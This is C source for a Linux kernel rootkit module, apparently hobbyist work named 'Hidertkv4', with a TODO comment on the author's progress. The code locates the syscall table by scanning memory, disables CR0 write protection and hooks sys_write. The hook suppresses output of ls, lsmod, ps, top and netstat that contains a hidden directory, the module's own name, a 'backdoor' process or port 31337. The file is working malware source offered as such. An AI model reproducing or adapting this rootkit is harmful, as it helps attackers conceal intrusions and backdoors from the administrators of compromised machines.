/*
[TODO]
Small problem: The current->comm contains "ls" in each case of ls -l or ls or ls -la ecc...
The write is different in the case of ls than the other: in the ls command a write contains multi files name, so with a return cont 
if the files are few we don't see anything; in the ls-l a single write correspond to a single file, so a "return cont" remove only the line
corresponding to that file and that is good!! 
I should analyze the task_struct ( http://www.spinics.net/lists/newbies/msg11186.html ) in order to know how "ls" is different from an "ls -l" and then 
I'll make a shift of the buffer write by "ls" and a "return cont" in the write made by "ls -l"  , if I put this IF now all the case jump in the "ls" branch cause
The current->comm contains "ls" in each case of ls -l or ls or ls -la like saied in first line, ad bad things happen.....

[NEWS]
But if I rename the directory with . that hide it, with ls is all ok and with ls -la too!!! 



[HIDING PROCESS WITH READDIR METHOD]

http://82.157.70.109/mirrorbooks/networksecuritytools/0596007949/networkst-CHP-7-SECT-3.html

http://lxr.free-electrons.com/source/include/linux/fs.h#L1528


*/


#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/unistd.h>
#include <linux/syscalls.h> 
#include <linux/sched.h> 
#include <asm/uaccess.h>
#include <asm/thread_info.h>



MODULE_LICENSE("GPL");
MODULE_AUTHOR("Degrigis");

unsigned long **sys_call_table;

asmlinkage int (*orig_write) (int, const char*, size_t);


static unsigned long **aquire_sys_call_table(void)
{
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;
		if (sct[__NR_close] == (unsigned long *) sys_close) 
			return sct;
		offset += sizeof(void *); 
	}
        
        printk(KERN_ALERT "Failed to load the sys_call_table");
	return NULL;
}


asmlinkage int my_sys_write(int fd, const char* buf, size_t count)
{
 if(!strcmp(current->comm, "ls") )  //Hide the malicious directory 
   {
    if( strstr(buf,"Hacked") != NULL)
	return count;
   }
 
 if(!strcmp(current->comm, "lsmod") ) //Hide this f*****g module! 
   {
     if( strstr(buf,"Hidertkv4") ) 
        return count;
   }

 if( (!strcmp(current->comm, "ps") ) || (!strcmp(current->comm, "top") )  ) //Hide the process in a brutal manner...I think it is better to hide with the /proc method [TODO]
   {
     if( strstr(buf,"backdoor") ) 
        return count;
   }

 if( (!strcmp(current->comm, "netstat") ) )  //Hide the tcp connection in netstat
   {
     if( strstr(buf,"31337") ) 
        return count;
   }

  return orig_write(fd,buf,count);
}


static void enable_page_protection(void) 
{
	unsigned long value;
	asm volatile("mov %%cr0, %0" : "=r" (value));

	if((value & 0x00010000))
		return;

	asm volatile("mov %0, %%cr0" : : "r" (value | 0x00010000));
}

static void disable_page_protection(void) 
{
	unsigned long value;
	asm volatile("mov %%cr0, %0" : "=r" (value));

	if(!(value & 0x00010000))
		return;

	asm volatile("mov %0, %%cr0" : : "r" (value & ~0x00010000));
}


static int __init startup_init(void)
{
if(!(sys_call_table = aquire_sys_call_table()))
   return -1;

disable_page_protection();
orig_write = (void *)sys_call_table[__NR_write];
sys_call_table[__NR_write] = (unsigned long *)my_sys_write;
enable_page_protection();

 return 0;
}

static void __exit shutdown_exit(void)
{
if(!sys_call_table)
		return;
disable_page_protection();
sys_call_table[__NR_write] = (unsigned long *)orig_write;
enable_page_protection();
}

module_init(startup_init);
module_exit(shutdown_exit);
